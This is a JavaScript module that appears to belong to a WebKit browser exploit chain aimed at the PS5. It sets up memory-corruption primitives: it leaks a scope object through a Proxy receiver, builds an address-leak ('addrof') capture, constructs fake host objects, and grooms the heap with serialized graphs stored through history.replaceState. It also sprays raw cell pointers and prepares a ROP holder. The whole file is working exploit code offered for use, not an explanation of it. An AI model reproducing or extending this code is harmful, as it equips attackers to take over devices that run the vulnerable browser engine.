(function () {
    "use strict";
    if (!window._ds || !window._ds.primitives || window._ds.addrof) return;
    var _ds = window._ds;
    var c = _ds.c;
    var s = _ds.s;
    var buf = _ds.buf;
    var mark = _ds.mark;

    // ── Notification request construction ────────────────────────────────────

    function buildNotificationRequest() {
        var trailing = c.NOTIFICATION_REQUEST_SIZE - c.NOTIFICATION_MESSAGE_OFFSET
            - c.NOTIFICATION_MESSAGE.length;
        if (trailing < 1)
            throw new Error("notification-message-too-long");
        s.notificationRequest = "\x00".repeat(c.NOTIFICATION_MESSAGE_OFFSET)
            + c.NOTIFICATION_MESSAGE + "\x00".repeat(trailing);
        s.notificationRequestOK = s.notificationRequest.length
            === c.NOTIFICATION_REQUEST_SIZE;
        for (var p = 0; p < c.NOTIFICATION_MESSAGE_OFFSET; ++p) {
            if (s.notificationRequest.charCodeAt(p) !== 0)
                s.notificationRequestOK = false;
        }
        for (var m = 0; m < c.NOTIFICATION_MESSAGE.length; ++m) {
            var messageCode = s.notificationRequest.charCodeAt(
                c.NOTIFICATION_MESSAGE_OFFSET + m);
            if (messageCode !== c.NOTIFICATION_MESSAGE.charCodeAt(m)
                || messageCode > 0x7f)
                s.notificationRequestOK = false;
        }
        for (var t = c.NOTIFICATION_MESSAGE_OFFSET + c.NOTIFICATION_MESSAGE.length;
            t < c.NOTIFICATION_REQUEST_SIZE; ++t) {
            if (s.notificationRequest.charCodeAt(t) !== 0)
                s.notificationRequestOK = false;
        }
        if (!s.notificationRequestOK)
            throw new Error("notification-request-layout-failed");
    }

    // ── Scope object leak (Proxy receiver capture) ───────────────────────────

    function leakScopeObject() {
        function LeakerBase() { }
        LeakerBase.prototype = new Proxy({}, {
            get: function (target, property, receiver) { return receiver; }
        });
        function Leaker() { }
        Leaker.prototype = Object.create(LeakerBase.prototype);
        Leaker.prototype.leak = function () { return LeakerBase.prototype.foo; };
        // The ES spec says super.foo inside a method resolves using the home
        // object's [[Prototype]], so receiver === the `this` of the call —
        // which is the scope object when called from a bare function ref.
        // Simplified alternative using class syntax:
        //   class L { leak() { return super.foo; } }
        //   L.prototype.__proto__ = new Proxy(...)
        //   return (function(){ return L.prototype.leak(); })();
        // We use the class form below since PS5 WebKit supports it:
        var C = (function () {
            // Using eval to construct a class avoids strict-mode issues in
            // some WebKit builds when assigning __proto__
            try {
                var klass = eval("(class Leaker2 { leak() { return super.foo; } })");
                klass.prototype.__proto__ = new Proxy({}, {
                    get: function (_t, _p, receiver) { return receiver; }
                });
                var fn = klass.prototype.leak;
                return (function () { return fn(); })();
            } catch (e) {
                // Fallback: manual prototype chain
                return null;
            }
        })();
        if (C !== null && C !== undefined) return C;
        // Fallback
        var leak = Leaker.prototype.leak;
        return (function () { return leak(); })();
    }

    // ── Symbol wrapper for addrof ────────────────────────────────────────────

    function prepareSymbolWrapper(F) {
        s.leakedScope = leakScopeObject();
        if (s.leakedScope === undefined || s.leakedScope === null)
            throw new Error("scope-not-leaked");

        for (var i = 0; i < 512; i++)
            s.leakedScope["p" + i] = i;
        for (var j = 0; j < 8; j++)
            s.leakedScope[j] = 1.1 * j;

        Object.defineProperty(s.leakedScope, "g", { get: F, configurable: true });
        return Object(s.leakedScope.g);
    }

    // ── Fake host object construction ────────────────────────────────────────

    function buildFakeHost() {
        s.rwBuffer = new ArrayBuffer(0x100);
        s.rwView = new Uint8Array(s.rwBuffer);
        s.rwMirror = new Uint8Array(s.rwBuffer);
        s.rwMirror[0] = 0x3c;

        s.targetBuffer = new ArrayBuffer(0x20);
        s.targetView = new Uint8Array(s.targetBuffer);
        s.targetView[0] = 0xa5;
        s.lengthWord = { keep: 0x51515151 };

        s.fakeHost = {
            q0: _ds.encodedHeaderNumber(),
            q1: 1.1,
            q2: s.rwView,
            q3: s.lengthWord,
            q4: 2.2,
            q5: 3.3
        };

        delete s.fakeHost.q1;
        delete s.fakeHost.q4;
        delete s.fakeHost.q5;

        if (!Number.isFinite(s.fakeHost.q0) || s.fakeHost.q2 !== s.rwView
            || s.fakeHost.q3 !== s.lengthWord || s.rwView[0] !== 0x3c
            || s.targetView[0] !== 0xa5 || typeof s.nativeTarget !== "function")
            throw new Error("fake-host-shape-failed");

        s.arenaBuffer = new ArrayBuffer(c.ARENA_BYTES);
        s.arenaView = new Uint8Array(s.arenaBuffer);
        s.arenaView[0xf00] = 0x52;
        s.arenaView[0xf01] = 0x4f;
        s.arenaView[0xf02] = 0x50;
        s.arenaView[0xf03] = 0x31;
        s.realCollator = new Intl.Collator("en", { usage: "search" });
        s.compareFn = s.realCollator.compare;
        if (!(s.compareFn("a", "b") < 0))
            throw new Error("collator-prewarm-failed");
        buildNotificationRequest();
        s.notificationPrewarmResult = s.compareFn(s.notificationRequest, "b");
        if (!Number.isFinite(s.notificationPrewarmResult))
            throw new Error("notification-request-prewarm-failed");
        s.holderGuardA = { marker: 0x484f4c44 };
        s.holderGuardB = { marker: 0x47554152 };
        s.targetHolder = {
            q0: s.nativeTarget,
            q1: s.arenaView,
            q2: s.realCollator,
            q3: s.compareFn,
            q4: s.holderGuardA,
            q5: s.holderGuardB
        };

        if (s.arenaView.length !== c.ARENA_BYTES || s.arenaView[0xf00] !== 0x52
            || s.targetHolder.q0 !== s.nativeTarget || s.targetHolder.q1 !== s.arenaView
            || s.targetHolder.q2 !== s.realCollator || s.targetHolder.q3 !== s.compareFn
            || s.targetHolder.q4 !== s.holderGuardA || s.targetHolder.q5 !== s.holderGuardB
            || typeof s.compareFn !== "function")
            throw new Error("notify-holder-shape-failed");
    }

    // ── Graph construction and storage ───────────────────────────────────────

    function buildAndStoreGraph() {
        s.referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
        buildFakeHost();

        mark("SSV-BUILD", "k=" + c.K + "-n=" + s.drainCount);
        s.fillerGraph = new Array(0xfffd);
        var pos = 0;
        var huge = 1n << 40n;
        for (var b = 0; b < c.FILLER_BIGINTS; ++b)
            s.fillerGraph[pos++] = huge + BigInt(b);
        for (var o = 0; o < c.FILLER_OBJECTS; ++o)
            s.fillerGraph[pos++] = {};

        s.outerGraph = new Array(c.CONTROL_INDEX + 1);
        s.outerGraph[0] = s.fillerGraph;
        s.outerGraph[1] = s.referenceTarget;
        s.outerGraph[2] = s.referenceTarget;
        s.outerGraph[c.CONTROL_INDEX] = c.CONTROL_INT;
        mark("SSV-BUILT", "duplicate-index=" + c.DUPLICATE_INDEX);

        mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - c.K).toString(16));
        history.replaceState(s.outerGraph, "");
        mark("SSV-STORED", "fake-host-and-rop-holder-not-serialized");
    }

    // ── Addrof preparation and capture ───────────────────────────────────────

    function prepareAddrof() {
        s.capturedWords = new Uint16Array(16);
        s.getterCarrier = function getterCarrierFunction() { return 7; };

        mark("ADDROF-PREP-BEGIN", "slots=" + c.CARRIER_SLOTS + "-bytes=" + c.CARRIER_BYTES);
        s.getterCarrier[0] = s.fakeHost;
        for (var i = 1; i < c.CARRIER_SLOTS; i++)
            s.getterCarrier[i] = 0;
        s.getterCarrier[1] = s.targetHolder;
        s.getterCarrier[2] = s.fakeHost;
        s.getterCarrier[3] = s.targetHolder;
        mark("ADDROF-CARRIER-DONE", "host-holder-host-holder");

        s.preparedSymbolObject = prepareSymbolWrapper(s.getterCarrier);
        mark("ADDROF-WRAPPER-READY", "wait=" + c.CAPTURE_DELAY_MS + "ms");

        setTimeout(runAddrofCapture, c.CAPTURE_DELAY_MS);
        setTimeout(function () {
            if (typeof _ds.beginComposition === "function") _ds.beginComposition();
        }, c.COMPOSE_DELAY_MS);
    }

    function runAddrofCapture() {
        try {
            s.capturedString = s.symbolToString.call(s.preparedSymbolObject);
            s.copiedLength = s.capturedString.length;
            for (var i = 0; i < 16; i++)
                s.capturedWords[i] = s.capturedString.charCodeAt(7 + i);
            s.captureState = 1;
        } catch (error) {
            s.captureError = error;
            s.captureState = -1;
        }
    }

    // ── Predecessor fill ─────────────────────────────────────────────────────

    function fillRawCellPointers(backing, pointer) {
        s.pointerHigh = Math.floor(pointer / 0x100000000);
        s.pointerLow = pointer - s.pointerHigh * 0x100000000;

        if (!_ds.plausibleCell(pointer)
            || s.pointerHigh < 0 || s.pointerHigh > 0xffff
            || Math.floor(s.pointerLow) !== s.pointerLow
            || s.pointerLow < 0 || s.pointerLow > 0xffffffff
            || s.pointerLow + s.pointerHigh * 0x100000000 !== pointer)
            throw new Error("invalid-low48-fake-address");

        s.predecessorWords = new Uint32Array(backing);
        for (var i = 0; i < s.predecessorWords.length; i += 2) {
            s.predecessorWords[i] = s.pointerLow;
            s.predecessorWords[i + 1] = s.pointerHigh;
        }

        var last = s.predecessorWords.length - 2;
        if (s.predecessorWords[0] !== s.pointerLow
            || s.predecessorWords[1] !== s.pointerHigh
            || s.predecessorWords[last] !== s.pointerLow
            || s.predecessorWords[last + 1] !== s.pointerHigh)
            throw new Error("pointer-fill-verification-failed");
    }

    function clearPredecessor() {
        if (s.predecessorWords !== null)
            s.predecessorWords.fill(0);
    }

    // ── Export to namespace ──────────────────────────────────────────────────
    _ds.buildNotificationRequest = buildNotificationRequest;
    _ds.leakScopeObject = leakScopeObject;
    _ds.prepareSymbolWrapper = prepareSymbolWrapper;
    _ds.buildFakeHost = buildFakeHost;
    _ds.buildAndStoreGraph = buildAndStoreGraph;
    _ds.prepareAddrof = prepareAddrof;
    _ds.runAddrofCapture = runAddrofCapture;
    _ds.fillRawCellPointers = fillRawCellPointers;
    _ds.clearPredecessor = clearPredecessor;
    _ds.addrof = true;
})();
